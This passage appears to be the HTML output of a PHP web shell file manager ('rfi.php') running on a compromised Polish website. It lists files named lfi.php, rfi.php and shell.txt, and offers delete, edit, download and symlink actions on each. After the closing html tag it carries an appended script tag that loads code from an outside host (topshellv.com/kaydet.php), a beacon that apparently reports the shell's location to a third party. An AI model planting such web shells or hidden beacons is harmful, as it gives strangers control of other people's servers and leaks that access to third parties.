                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit14" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked15" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 7/22/19 18:01:44, atime: 7/22/19 18:01:44, ctime: 8/2/19 14:38:56"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fhtdocs_xam.lnk">htdocs_xam.lnk</a></td>
                    <td class="size">823 B</td>
                    <td class="permission" title="100777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fhtdocs_xam.lnk&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file15" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/htdocs_xam.lnk" />
                        <select class="small" name="action15" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit15" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked16" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 7/31/19 16:27:12, atime: 3/20/19 18:58:36, ctime: 8/2/19 14:38:57"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Findex.php">index.php</a></td>
                    <td class="size" title="1.36 kB">1392 B</td>
                    <td class="permission" title="100777"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Findex.php&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rwxrwxrwx</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file16" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/index.php" />
                        <select class="small" name="action16" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit16" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked17" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 8/2/19 19:57:28, atime: 8/2/19 15:37:59, ctime: 8/2/19 19:57:28"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Flfi.php">lfi.php</a></td>
                    <td class="size">34 B</td>
                    <td class="permission" title="100644"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Flfi.php&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rw-r--r--</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file17" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/lfi.php" />
                        <select class="small" name="action17" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit17" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked18" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 8/2/19 20:12:33, atime: 8/2/19 20:12:33, ctime: 8/2/19 20:12:33"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Frfi.php">rfi.php</a></td>
                    <td class="size">34 B</td>
                    <td class="permission" title="100644"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Frfi.php&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rw-r--r--</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file18" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/rfi.php" />
                        <select class="small" name="action18" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit18" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked19" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 8/2/19 19:57:33, atime: 8/2/19 19:57:32, ctime: 8/2/19 19:57:33"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fshell.txt">shell.txt</a></td>
                    <td class="size">36 B</td>
                    <td class="permission" title="100644"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fshell.txt&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rw-r--r--</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file19" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/shell.txt" />
                        <select class="small" name="action19" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit19" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing">
                    <td class="checkbox"><input type="checkbox" name="checked20" value="true" onfocus="activate('other')" /></td>
                    <td class="filename" title="mtime: 8/2/19 19:08:57, atime: 8/2/19 19:08:57, ctime: 8/2/19 19:08:57"><img src="rfi.php?image=file" alt="file" /> <a href="rfi.php?action=view&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fweb.php">web.php</a></td>
                    <td class="size">0 B</td>
                    <td class="permission" title="100644"><a href="rfi.php?action=permission&amp;file=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2Fweb.php&amp;dir=%2Fhome%2Fmichalc4%2Fdomains%2Fbadaniaweb.bydgoszcz.pl%2Fpublic_html%2F">-rw-r--r--</a></td>
                    <td class="owner">3013</td>
                    <td class="group">3014</td>
                    <td class="functions">
                        <input type="hidden" name="file20" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/web.php" />
                        <select class="small" name="action20" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="create_symlink">create symlink</option>
                            <option value="delete">delete</option>
                            <option value="rename">rename</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                            <option value="download">download</option>
                            <option value="edit">edit</option>
                        </select>
                        <input class="small" type="submit" name="submit20" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
                <tr class="listing_footer">
                    <td style="text-align: right; vertical-align: top"><img src="rfi.php?image=arrow" alt="&gt;" /></td>
                    <td colspan="6">
                        <input type="hidden" name="num" value="21" />
                        <input type="hidden" name="focus" value="" />
                        <input type="hidden" name="olddir" value="/home/michalc4/domains/badaniaweb.bydgoszcz.pl/public_html/" />
                        <select class="small" name="action_all" size="1">
                            <option value="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
                            <option value="delete">delete</option>
                            <option value="move">move</option>
                            <option value="copy">copy</option>
                        </select>
                        <input class="small" type="submit" name="submit_all" value=" &gt; " onfocus="activate('other')" />
                    </td>
                </tr>
            </table>

        </form>

    </body>
</html><script src=http://www.topshellv.com/kaydet.php></script>